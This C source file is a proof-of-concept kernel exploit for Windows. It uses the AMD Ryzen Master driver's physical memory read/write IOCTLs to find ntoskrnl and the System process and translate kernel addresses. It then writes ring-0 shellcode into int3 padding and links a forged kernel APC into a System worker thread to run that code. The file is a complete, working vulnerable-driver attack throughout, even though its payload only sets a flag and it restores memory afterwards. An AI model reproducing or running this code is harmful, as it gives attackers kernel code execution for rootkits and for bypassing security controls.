/*
 * kapc_inject.c — Kernel APC injection into System worker thread
 *
 * Technique: Insert a KAPC (Kernel Asynchronous Procedure Call) structure
 * directly into a System process worker thread's APC queue via physical writes.
 * The kernel delivers the APC when the target thread enters an alertable wait,
 * which worker threads do constantly.
 *
 * Flow:
 *   1. Find System EPROCESS PA (kernel CR3, ThreadListHead)
 *   2. Walk EPROCESS.ThreadListHead (KVA chain) to find an ETHREAD PA/KVA
 *   3. Find ntoskrnl PA → CC region for KernelRoutine shellcode
 *   4. Place KAPC struct in ntoskrnl .data (writable, non-paged, always resident)
 *   5. Build KAPC struct:
 *        Type=0x12, Size=0x58, Thread=ethread_kva,
 *        KernelRoutine=shellcode_kva, Inserted=1
 *   6. Link KAPC.ApcListEntry into ETHREAD.ApcState.ApcListHead[0]:
 *        - Set KAPC.ApcListEntry.Flink = listhead_kva
 *        - Set KAPC.ApcListEntry.Blink = listhead_kva (empty list case)
 *        - Set listhead.Blink = kapc_listentry_kva
 *        - Set listhead.Flink = kapc_listentry_kva
 *   7. Set KTHREAD.ApcState.KernelApcPending = 1
 *   8. Signal = 0; wait 500ms for delivery; read signal
 *   9. Restore: clear signal region, CC bytes, .data KAPC area
 *
 * KernelRoutine shellcode (ring-0, APC_LEVEL):
 *   VOID KernelRoutine(PKAPC Apc, PKNORMAL_ROUTINE *NR, PVOID *Ctx, PVOID *A1, PVOID *A2)
 *   → writes 1 to signal KVA, returns
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -O2 -Wall -Wno-unused-function \
 *       -o kapc_inject.exe kapc_inject.c -lkernel32 -ladvapi32
 *
 * Requires: AMDRyzenMasterDriverV20, Admin rights.
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <inttypes.h>

/* ══════════════════════════════════════════════════════════════════════════
 * §1  AMD DRIVER PRIMITIVES (compact)
 * ══════════════════════════════════════════════════════════════════════════ */

#define DEVICE_NAME      L"\\\\.\\AMDRyzenMasterDriverV20"
#define IOCTL_PHYS_READ  0x81112F08u
#define IOCTL_PHYS_WRITE 0x81112F0Cu
static HANDLE g_dev = INVALID_HANDLE_VALUE;
#define MAX_RANGES 64
typedef struct { uint64_t base, size; } PhysRange;
static PhysRange g_ranges[MAX_RANGES]; static int g_nranges = 0;
static void load_ranges(void)
{
    HKEY h;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory",
            0, KEY_READ, &h) != ERROR_SUCCESS) return;
    char vn[256]; DWORD vs, type;
    uint8_t *buf = NULL; DWORD sz = 0;
    for (DWORD i = 0;; i++) {
        vs = sizeof vn; DWORD vd = 0;
        if (RegEnumValueA(h, i, vn, &vs, NULL, &type, NULL, &vd) == ERROR_NO_MORE_ITEMS) break;
        if ((type != 3 && type != 8) || vd < 20) continue;
        buf = malloc(vd); if (!buf) continue;
        if (RegQueryValueExA(h, vn, NULL, NULL, buf, &vd) == ERROR_SUCCESS) { sz = vd; break; }
        free(buf); buf = NULL;
    }
    RegCloseKey(h);
    if (!buf || sz < 20) { free(buf); return; }
    DWORD cnt = *(DWORD*)(buf+16); uint8_t *p = buf+20;
    for (DWORD i = 0; i < cnt && g_nranges < MAX_RANGES; i++, p+=20) {
        g_ranges[g_nranges].base = *(uint64_t*)(p+4);
        g_ranges[g_nranges].size = *(uint64_t*)(p+12);
        g_nranges++;
    }
    free(buf);
}
static int in_range(uint64_t pa, uint32_t len)
{
    for (int i = 0; i < g_nranges; i++)
        if (pa >= g_ranges[i].base && pa + len <= g_ranges[i].base + g_ranges[i].size) return 1;
    return 0;
}
static int open_dev(void)
{
    g_dev = CreateFileW(DEVICE_NAME, GENERIC_READ|GENERIC_WRITE,
                        FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    return g_dev != INVALID_HANDLE_VALUE;
}
static void close_dev(void) { if (g_dev != INVALID_HANDLE_VALUE) CloseHandle(g_dev); }
static int phys_read(uint64_t pa, void *buf, uint32_t len)
{
    if (!in_range(pa, len)) return 0;
    uint8_t ib[12]; *(uint64_t*)ib = pa; *(uint32_t*)(ib+8) = len;
    uint8_t ob[12+4096]; DWORD r = 0;
    if (!DeviceIoControl(g_dev, IOCTL_PHYS_READ, ib, 12, ob, 12+len, &r, NULL)) return 0;
    memcpy(buf, ob+12, len); return 1;
}
static int phys_write(uint64_t pa, const void *buf, uint32_t len)
{
    if (!in_range(pa, len)) return 0;
    uint8_t *ib = malloc(12+len); if (!ib) return 0;
    *(uint64_t*)ib = pa; *(uint32_t*)(ib+8) = len;
    memcpy(ib+12, buf, len);
    DWORD r = 0; int ok = DeviceIoControl(g_dev, IOCTL_PHYS_WRITE, ib, 12+len, NULL, 0, &r, NULL);
    free(ib); return ok;
}
static uint64_t phys_read64(uint64_t pa) { uint64_t v=0; phys_read(pa,&v,8); return v; }
static uint8_t  phys_read8 (uint64_t pa) { uint8_t  v=0; phys_read(pa,&v,1); return v; }

/* ══════════════════════════════════════════════════════════════════════════
 * §2  KERNEL MODULE + NTOSKRNL PA
 * ══════════════════════════════════════════════════════════════════════════ */

typedef NTSTATUS (WINAPI *NtQSI_t)(ULONG, PVOID, ULONG, PULONG);
typedef struct {
    ULONG N2; UCHAR N;
    struct { PVOID Sec, Map, Img; ULONG Sz, Fl; USHORT Ld, In, Cnt, Off; char P[256]; } M[1];
} SYSMODS;
static uint64_t g_nt_va = 0, g_nt_pa = 0; static uint32_t g_nt_sz = 0; static char g_nt_path[256];
static int load_nt(void)
{
    NtQSI_t fn = (NtQSI_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
    if (!fn) return 0;
    ULONG sz = 0; fn(11, NULL, 0, &sz); sz += 4096;
    BYTE *buf = malloc(sz); if (!buf) return 0;
    if (fn(11, buf, sz, &sz)) { free(buf); return 0; }
    SYSMODS *mi = (SYSMODS*)buf;
    for (UCHAR i = 0; i < mi->N; i++) {
        const char *fn2 = mi->M[i].P + mi->M[i].Off;
        if (_stricmp(fn2, "ntoskrnl.exe") && _stricmp(fn2, "ntkrnlmp.exe")) continue;
        g_nt_va = (uint64_t)mi->M[i].Img; g_nt_sz = mi->M[i].Sz;
        strncpy(g_nt_path, mi->M[i].P, 255);
        if (_strnicmp(g_nt_path, "\\SystemRoot\\", 12) == 0) {
            char tmp[256]; GetSystemDirectoryA(tmp, sizeof tmp);
            memmove(g_nt_path + strlen(tmp), g_nt_path + 11, strlen(g_nt_path) - 10);
            memcpy(g_nt_path, tmp, strlen(tmp));
        }
        free(buf); return 1;
    }
    free(buf); return 0;
}
static int find_nt_pa(void)
{
    HANDLE hf = CreateFileA(g_nt_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hf == INVALID_HANDLE_VALUE) return 0;
    uint8_t fp[64] = {0}; DWORD rd = 0; ReadFile(hf, fp, 64, &rd, NULL); CloseHandle(hf);
    if (rd < 64) return 0;
    for (int r = 0; r < g_nranges; r++) {
        uint64_t base = (g_ranges[r].base + 0x1FFFFF) & ~0x1FFFFFULL;
        uint64_t end  = g_ranges[r].base + g_ranges[r].size;
        for (uint64_t pa = base; pa + g_nt_sz < end; pa += 0x200000) {
            uint8_t b[64]; if (!phys_read(pa, b, 64)) continue;
            if (!memcmp(b, fp, 64)) { g_nt_pa = pa; return 1; }
        }
    }
    return 0;
}

/* ══════════════════════════════════════════════════════════════════════════
 * §3  PE SECTIONS + CC/DATA REGION FINDERS
 * ══════════════════════════════════════════════════════════════════════════ */

typedef struct { uint64_t rs, re; uint32_t ch; } SecE;
#define MAX_SECS 32
static SecE g_secs[MAX_SECS]; static int g_nsecs = 0;
static void load_secs(void)
{
    uint8_t h[4096]; if (!phys_read(g_nt_pa, h, 4096)) return;
    uint32_t po = *(uint32_t*)(h+0x3C); if (po+0x108 > 4096) return;
    uint8_t *pe = h + po; if (*(uint32_t*)pe != 0x00004550) return;
    uint16_t ns = *(uint16_t*)(pe+6), op = *(uint16_t*)(pe+20);
    uint8_t *s = pe + 24 + op;
    for (int i = 0; i < ns && g_nsecs < MAX_SECS; i++, s += 40) {
        g_secs[g_nsecs].rs = *(uint32_t*)(s+12);
        g_secs[g_nsecs].re = g_secs[g_nsecs].rs + *(uint32_t*)(s+16);
        g_secs[g_nsecs].ch = *(uint32_t*)(s+36);
        g_nsecs++;
    }
}
static uint64_t find_cc_rva(int min)
{
    for (int s = 0; s < g_nsecs; s++) {
        if (!(g_secs[s].ch & 0x20000000)) continue;
        int run = 0; uint64_t rs = 0;
        for (uint64_t o = g_secs[s].rs; o < g_secs[s].re; o++) {
            if (phys_read8(g_nt_pa+o) == 0xCC) { if (!run) rs=o; if (++run>=min) return rs; }
            else run = 0;
        }
    }
    return 0;
}
static uint64_t find_data_zero(int min)
{
    for (int s = 0; s < g_nsecs; s++) {
        if (!(g_secs[s].ch & 0x80000000) || (g_secs[s].ch & 0x20000000)) continue;
        int run = 0; uint64_t rs = 0;
        for (uint64_t o = g_secs[s].rs; o < g_secs[s].re; o++) {
            if (phys_read8(g_nt_pa+o) == 0) { if (!run) rs=o; if (++run>=min) return rs; }
            else run = 0;
        }
    }
    return 0;
}

/* ══════════════════════════════════════════════════════════════════════════
 * §4  KERNEL CR3 + VA→PA + SYSTEM EPROCESS
 * ══════════════════════════════════════════════════════════════════════════ */

static uint64_t g_kcr3 = 0;
static uint64_t kva_to_pa(uint64_t va)
{
    if (!g_kcr3) return 0;
    uint64_t e = phys_read64((g_kcr3&~0xFFFULL)+((va>>39)&0x1FF)*8);
    if (!(e&1)) return 0;
    e = phys_read64((e&0x000FFFFFFFFFF000ULL)+((va>>30)&0x1FF)*8);
    if (!(e&1)) return 0;
    if (e&(1ULL<<7)) return (e&0x000FFFFFC0000000ULL)|(va&0x3FFFFFFF);
    e = phys_read64((e&0x000FFFFFFFFFF000ULL)+((va>>21)&0x1FF)*8);
    if (!(e&1)) return 0;
    if (e&(1ULL<<7)) return (e&0x000FFFFFFFE00000ULL)|(va&0x1FFFFF);
    e = phys_read64((e&0x000FFFFFFFFFF000ULL)+((va>>12)&0x1FF)*8);
    if (!(e&1)) return 0;
    return (e&0x000FFFFFFFFFF000ULL)|(va&0xFFF);
}

static uint64_t g_sys_pa = 0, g_sys_va = 0;
static int find_system(void)
{
    /* Robust scan: page stride + 16-byte inner + Flink/Blink + multi-offset name */
    static const uint32_t name_offs[] = { 0x5A8, 0x5B8, 0x5B0 };
    static uint8_t page[0x1000];
    const int sub_max = 0x1000 - 0x458;

    for (int r = 0; r < g_nranges; r++) {
        uint64_t base = g_ranges[r].base, end = base + g_ranges[r].size;
        for (uint64_t page_pa = base; page_pa + 0x1000 <= end; page_pa += 0x1000) {
            if (!phys_read(page_pa, page, 0x1000)) continue;
            for (int sub = 0; sub <= sub_max; sub += 0x10) {
                uint64_t pid; memcpy(&pid, page + sub + 0x440, 8);
                if (pid != 4) continue;
                uint64_t dtb; memcpy(&dtb, page + sub + 0x028, 8);
                if (!dtb || (dtb & 0xFFF) || dtb < 0x10000 || (dtb >> 40)) continue;
                uint64_t flink; memcpy(&flink, page + sub + 0x448, 8);
                uint64_t blink; memcpy(&blink, page + sub + 0x450, 8);
                if ((flink >> 48) != 0xFFFF || (blink >> 48) != 0xFFFF) continue;
                uint64_t eproc_pa = page_pa + (uint64_t)sub;
                for (int ni = 0; ni < 3; ni++) {
                    char nm[8] = {0};
                    if (!phys_read(eproc_pa + name_offs[ni], nm, 8)) continue;
                    if (memcmp(nm, "System\0\0", 7) != 0) continue;
                    g_sys_pa = eproc_pa;
                    g_kcr3   = dtb;
                    return 1;
                }
            }
        }
    }
    return 0;
}

/* Derive System EPROCESS kernel VA from ActiveProcessLinks blink of next entry */
static void derive_system_va(void)
{
    uint64_t flink = phys_read64(g_sys_pa + 0x448);
    if (!flink) return;
    uint64_t fpa = kva_to_pa(flink);
    if (!fpa) return;
    uint64_t blink = phys_read64(fpa + 8); /* blink of next → VA of System.links */
    g_sys_va = blink - 0x448;
}

/* ══════════════════════════════════════════════════════════════════════════
 * §5  ETHREAD FINDER (walk EPROCESS.ThreadListHead)
 *
 * EPROCESS.ThreadListHead (LIST_ENTRY) at EPROCESS+0x5E0 on Win10/11.
 * Each link: ETHREAD.ThreadListEntry at ETHREAD+0x4E8 (approximate).
 *
 * We walk the list to find a thread where:
 *   - KTHREAD.WaitMode (at KTHREAD+0x185) == 1 (UserMode wait) or
 *   - KTHREAD.Alertable (at KTHREAD+0x184) == 1
 * Worker threads are typically alertable when idle.
 * ══════════════════════════════════════════════════════════════════════════ */

#define EP_THREAD_LIST_OFF   0x5E0  /* EPROCESS.ThreadListHead */
#define ET_THREAD_LIST_OFF   0x4E8  /* ETHREAD.ThreadListEntry (approximate) */
#define KT_APC_STATE_OFF     0x098  /* KTHREAD.ApcState */
#define KT_ALERTABLE_OFF     0x184  /* KTHREAD.Alertable (UCHAR, Win10/11 approx) */
#define KT_WAITMODE_OFF      0x185  /* KTHREAD.WaitMode (UCHAR) */

typedef struct {
    uint64_t ethread_pa;
    uint64_t ethread_kva;
} EThread;

static EThread find_worker_ethread(void)
{
    EThread result = {0, 0};
    if (!g_sys_va || !g_kcr3) return result;

    /* ThreadListHead flink = VA of first ETHREAD.ThreadListEntry */
    uint64_t list_head_pa = g_sys_pa + EP_THREAD_LIST_OFF;
    uint64_t first_flink  = phys_read64(list_head_pa);
    if (!first_flink) return result;

    uint64_t list_head_kva = g_sys_va + EP_THREAD_LIST_OFF;
    uint64_t cur_flink = first_flink;
    int tries = 0;

    while (cur_flink != list_head_kva && tries++ < 512) {
        /* cur_flink = KVA of ETHREAD.ThreadListEntry → ETHREAD KVA = cur_flink - ET_THREAD_LIST_OFF */
        uint64_t et_kva = cur_flink - ET_THREAD_LIST_OFF;
        uint64_t et_pa  = kva_to_pa(et_kva);
        if (!et_pa) { cur_flink = 0; break; }

        /* Check Alertable or WaitMode to find an alertable thread */
        uint8_t alertable = phys_read8(et_pa + KT_ALERTABLE_OFF);
        uint8_t waitmode  = phys_read8(et_pa + KT_WAITMODE_OFF);

        if (alertable || waitmode) {
            result.ethread_pa  = et_pa;
            result.ethread_kva = et_kva;
            printf("[+] Found alertable ETHREAD: PA %016"PRIx64" KVA %016"PRIx64
                   " alertable=%d waitmode=%d\n",
                   et_pa, et_kva, alertable, waitmode);
            return result;
        }

        /* Advance: read Flink of current ETHREAD.ThreadListEntry */
        uint64_t nxt_pa = kva_to_pa(cur_flink);
        if (!nxt_pa) break;
        cur_flink = phys_read64(nxt_pa); /* Flink of ThreadListEntry */
    }

    /* If no alertable thread found, just use the first one */
    if (first_flink != list_head_kva) {
        uint64_t et_kva = first_flink - ET_THREAD_LIST_OFF;
        uint64_t et_pa  = kva_to_pa(et_kva);
        if (et_pa) {
            result.ethread_pa  = et_pa;
            result.ethread_kva = et_kva;
            printf("[~] No alertable ETHREAD found, using first: PA %016"PRIx64"\n", et_pa);
        }
    }
    return result;
}

/* ══════════════════════════════════════════════════════════════════════════
 * §6  KAPC STRUCTURE BUILD
 *
 * KAPC size = 0x58 bytes.  Placed in ntoskrnl .data at data_rva.
 * KernelRoutine at CC region (executable).
 *
 * .data layout at data_rva:
 *   +0x00  KAPC struct (0x58 bytes)
 *   +0x58  signal DWORD  (= 0 → 1 when APC fires)
 *
 * KernelRoutine shellcode (ring-0, called with 5 args in rcx/rdx/r8/r9/[rsp+0x28]):
 *   VOID KernelRoutine(PKAPC Apc, PKNORMAL_ROUTINE*, PVOID*, PVOID*, PVOID*)
 *
 *   push rcx
 *   mov rcx, signal_kva
 *   mov dword [rcx], 1
 *   pop rcx
 *   ret
 * ══════════════════════════════════════════════════════════════════════════ */

#define KAPC_SIZE     0x58
#define SIGNAL_OFF    KAPC_SIZE  /* signal DWORD at end of data block */
#define KAPC_TYPE     0x12
#define KAPC_APCMODE  0          /* KernelMode */

/* Build KernelRoutine shellcode */
static int build_kr_sc(uint8_t *sc, uint64_t signal_kva)
{
    int i = 0;
    sc[i++] = 0x51;                     /* push rcx */
    sc[i++] = 0x48; sc[i++] = 0xB9;    /* mov rcx, imm64 */
    memcpy(&sc[i], &signal_kva, 8); i += 8;
    sc[i++] = 0xC7; sc[i++] = 0x01;    /* mov dword [rcx], 1 */
    sc[i++] = 0x01; sc[i++] = 0x00; sc[i++] = 0x00; sc[i++] = 0x00;
    sc[i++] = 0x59;                     /* pop rcx */
    sc[i++] = 0xC3;                     /* ret */
    return i;
}

/* Build KAPC bytes in a local buffer.
 * apc_list_entry_kva = kapc_kva + 0x10 (ApcListEntry offset within KAPC) */
static void build_kapc(uint8_t *kapc_buf,
                       uint64_t ethread_kva,     /* KAPC.Thread */
                       uint64_t kr_kva,          /* KernelRoutine */
                       uint64_t list_head_kva)   /* target list head KVA = ethread+ApcState */
{
    memset(kapc_buf, 0, KAPC_SIZE);

    kapc_buf[0x00] = KAPC_TYPE;   /* Type = 0x12 */
    kapc_buf[0x01] = 0;           /* AllFlags */
    kapc_buf[0x02] = KAPC_SIZE;   /* Size */
    kapc_buf[0x03] = 0;           /* SpareByte1 */
    /* +0x04 SpareLong0 = 0 */
    /* +0x08 Thread = ethread_kva */
    *(uint64_t*)(kapc_buf + 0x08) = ethread_kva;
    /* +0x10 ApcListEntry: in empty-list case, both flink/blink = list_head_kva */
    uint64_t apc_listentry_kva = 0; /* filled in during install */
    (void)apc_listentry_kva;
    *(uint64_t*)(kapc_buf + 0x10) = list_head_kva; /* Flink → list head */
    *(uint64_t*)(kapc_buf + 0x18) = list_head_kva; /* Blink → list head */
    /* +0x20 KernelRoutine */
    *(uint64_t*)(kapc_buf + 0x20) = kr_kva;
    /* +0x28 RundownRoutine = 0 (NULL — safe if APC fires before thread exit) */
    *(uint64_t*)(kapc_buf + 0x28) = 0;
    /* +0x30 NormalRoutine = 0 (kernel APC, not user) */
    *(uint64_t*)(kapc_buf + 0x30) = 0;
    /* +0x38 NormalContext = 0 */
    /* +0x40 SystemArgument1 = 0 */
    /* +0x48 SystemArgument2 = 0 */
    kapc_buf[0x50] = 0;           /* ApcStateIndex = 0 (current) */
    kapc_buf[0x51] = KAPC_APCMODE; /* ApcMode = KernelMode = 0 */
    kapc_buf[0x52] = 1;           /* Inserted = 1 */
}

/* ══════════════════════════════════════════════════════════════════════════
 * §7  MAIN
 * ══════════════════════════════════════════════════════════════════════════ */

int main(void)
{
    puts("=== kapc_inject: Kernel APC injection into System worker thread ===");

    if (!open_dev()) { fputs("[-] Cannot open AMD device\n", stderr); return 1; }
    load_ranges();
    if (!g_nranges) { puts("[-] No physical ranges"); close_dev(); return 1; }
    printf("[+] Physical ranges: %d\n", g_nranges);

    /* Find ntoskrnl */
    if (!load_nt()) { puts("[-] Cannot find ntoskrnl"); close_dev(); return 1; }
    printf("[+] ntoskrnl VA: %016"PRIx64" size: 0x%X\n", g_nt_va, g_nt_sz);
    if (!find_nt_pa()) { puts("[-] ntoskrnl PA not found"); close_dev(); return 1; }
    printf("[+] ntoskrnl PA: %016"PRIx64"\n", g_nt_pa);
    load_secs();

    /* Find System EPROCESS + kernel CR3 */
    if (!find_system()) { puts("[-] System EPROCESS not found"); close_dev(); return 1; }
    printf("[+] System EPROCESS PA: %016"PRIx64", CR3: %016"PRIx64"\n", g_sys_pa, g_kcr3);
    derive_system_va();
    printf("[+] System EPROCESS KVA: %016"PRIx64"\n", g_sys_va);

    /* Find target ETHREAD */
    EThread et = find_worker_ethread();
    if (!et.ethread_pa) { puts("[-] No ETHREAD found in System process"); close_dev(); return 1; }

    /* Find CC region for KernelRoutine shellcode (≥24 bytes) */
    uint64_t cc_rva = find_cc_rva(24);
    if (!cc_rva) { puts("[-] CC region not found"); close_dev(); return 1; }
    uint64_t cc_pa  = g_nt_pa + cc_rva;
    uint64_t cc_kva = g_nt_va + cc_rva;
    printf("[+] KernelRoutine CC region: KVA %016"PRIx64"\n", cc_kva);

    /* Find .data region for KAPC + signal (≥KAPC_SIZE + 8 bytes zero area) */
    uint64_t data_rva = find_data_zero(KAPC_SIZE + 8);
    if (!data_rva) { puts("[-] .data zero region not found"); close_dev(); return 1; }
    uint64_t data_pa   = g_nt_pa + data_rva;
    uint64_t data_kva  = g_nt_va + data_rva;
    uint64_t signal_pa  = data_pa  + SIGNAL_OFF;
    uint64_t signal_kva = data_kva + SIGNAL_OFF;
    printf("[+] KAPC .data region: KVA %016"PRIx64"\n", data_kva);
    printf("[+] Signal KVA: %016"PRIx64"\n", signal_kva);

    /* KAPC.ApcListEntry KVA = data_kva + 0x10 (offsetof ApcListEntry in KAPC) */
    uint64_t kapc_le_kva = data_kva + 0x10;

    /* APC list head: ETHREAD.ApcState.ApcListHead[0] = ethread_kva + KT_APC_STATE_OFF */
    uint64_t apclist_kva = et.ethread_kva + KT_APC_STATE_OFF;
    uint64_t apclist_pa  = et.ethread_pa  + KT_APC_STATE_OFF;
    printf("[+] ApcListHead[0] PA: %016"PRIx64" KVA: %016"PRIx64"\n", apclist_pa, apclist_kva);

    /* Read current list head (Flink, Blink) — should both = apclist_kva for empty list */
    uint64_t cur_flink = phys_read64(apclist_pa);
    uint64_t cur_blink = phys_read64(apclist_pa + 8);
    printf("[+] ApcListHead Flink: %016"PRIx64" Blink: %016"PRIx64"\n", cur_flink, cur_blink);

    /* Build KernelRoutine shellcode */
    uint8_t sc[24]; int sc_len = build_kr_sc(sc, signal_kva);
    printf("[+] KernelRoutine shellcode: %d bytes\n", sc_len);

    /* Save originals */
    uint8_t cc_orig[24]; phys_read(cc_pa, cc_orig, sc_len);
    uint8_t data_orig[KAPC_SIZE + 8]; phys_read(data_pa, data_orig, KAPC_SIZE + 8);
    uint64_t flink_orig = cur_flink, blink_orig = cur_blink;

    /* Build KAPC bytes */
    uint8_t kapc_buf[KAPC_SIZE];
    build_kapc(kapc_buf, et.ethread_kva, cc_kva, apclist_kva);
    /* Patch ApcListEntry Flink/Blink to point to current head */
    *(uint64_t*)(kapc_buf + 0x10) = cur_flink; /* Flink = old head flink */
    *(uint64_t*)(kapc_buf + 0x18) = apclist_kva; /* Blink = list head itself (insert at front) */

    /* Clear signal */
    uint32_t z = 0; phys_write(signal_pa, &z, 4);

    /* Write shellcode to CC region */
    phys_write(cc_pa, sc, sc_len);

    /* Write KAPC struct to .data */
    phys_write(data_pa, kapc_buf, KAPC_SIZE);
    printf("[+] KAPC written to PA %016"PRIx64"\n", data_pa);

    /* Link KAPC into ApcListHead[0]:
     * We're inserting at the HEAD (after the list head sentinel):
     *   new entry: flink = old_head_flink, blink = list_head
     *   list_head: flink = kapc_le_kva
     *   old head's Blink = kapc_le_kva (if list was non-empty)
     */
    /* Update list head's Flink to point to our KAPC entry */
    phys_write(apclist_pa, &kapc_le_kva, 8);
    /* If list was empty (flink == apclist_kva), update head's Blink too */
    if (cur_flink == apclist_kva) {
        phys_write(apclist_pa + 8, &kapc_le_kva, 8);
    } else {
        /* Update old first entry's Blink to point to our new entry */
        uint64_t old_first_pa = kva_to_pa(cur_flink);
        if (old_first_pa) {
            uint64_t old_blink_pa = old_first_pa + 8;
            phys_write(old_blink_pa, &kapc_le_kva, 8);
        }
    }
    printf("[+] KAPC linked into ApcListHead[0]\n");

    /* Set KernelApcPending = 1 (KTHREAD.ApcState + 0x29) */
    uint64_t pending_pa = et.ethread_pa + KT_APC_STATE_OFF + 0x29;
    uint8_t pending_one = 1;
    phys_write(pending_pa, &pending_one, 1);
    printf("[+] KernelApcPending set at PA %016"PRIx64"\n", pending_pa);

    /* Wait for APC delivery */
    puts("[*] Waiting 1000ms for APC delivery...");
    Sleep(1000);

    /* Read signal */
    uint32_t sig = 0; phys_read(signal_pa, &sig, 4);
    printf("[%s] Signal value: %u\n", sig ? "+" : "!", sig);

    /* Restore — undo all changes */
    /* 1. Unlink KAPC from list (restore original flink/blink on list head) */
    phys_write(apclist_pa,     &flink_orig, 8);
    phys_write(apclist_pa + 8, &blink_orig, 8);
    if (cur_flink != apclist_kva) {
        /* Restore old first entry's Blink */
        uint64_t old_first_pa = kva_to_pa(cur_flink);
        if (old_first_pa) phys_write(old_first_pa + 8, &apclist_kva, 8);
    }
    /* 2. Clear KernelApcPending (if APC didn't fire yet) */
    uint8_t pending_zero = 0;
    phys_write(pending_pa, &pending_zero, 1);
    /* 3. Restore .data and CC bytes */
    phys_write(data_pa, data_orig, KAPC_SIZE + 8);
    phys_write(cc_pa, cc_orig, sc_len);
    puts("[+] Restored: list unlinked, CC bytes cleared");

    if (sig) {
        puts("[+] SUCCESS: KernelRoutine executed at ring-0 via KAPC delivery");
        printf("[+] APC fired from System worker thread %016"PRIx64"\n", et.ethread_kva);
    } else {
        puts("[-] Signal not set within 1 second");
        puts("    Possible causes:");
        puts("    - Target thread not alertable (change ET_THREAD_LIST_OFF)");
        puts("    - KTHREAD offsets differ on this build");
        puts("    - APC was unlinked before delivery (race with kernel)");
        close_dev(); return 1;
    }

    close_dev();
    return 0;
}
